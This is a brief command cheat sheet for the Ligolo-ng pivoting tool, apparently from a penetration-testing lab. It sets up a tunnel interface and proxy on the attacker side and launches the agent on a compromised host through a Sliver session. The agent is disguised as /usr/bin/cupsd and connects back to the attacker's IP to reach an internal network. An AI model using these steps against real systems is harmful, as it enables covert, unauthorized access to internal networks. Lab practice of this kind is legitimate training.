# Ligolo-ng

### Quick Pasta

```
# proxy setup on attacker machine
sudo ip tuntap add user ubuntu mode tun ligolo
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.1.0/24 dev ligolo
5: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
    link/none
./proxy -selfcert -laddr 0.0.0.0:1080
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:1080
# agent from victim machine
- from sliver 
execute -t 1000000000 /usr/bin/cupsd -connect 10.10.14.2:1080 -ignore-cert
ligolo-ng » INFO[0672] Agent joined.                                 name=root@DANTE-WEB-NIX01 remote="10.10.110.100:58358"
# from attacker machine ligolo-ng cmd
session 
- choose session 
tunnel_start
- verify 
curl http://172.16.1.1
```
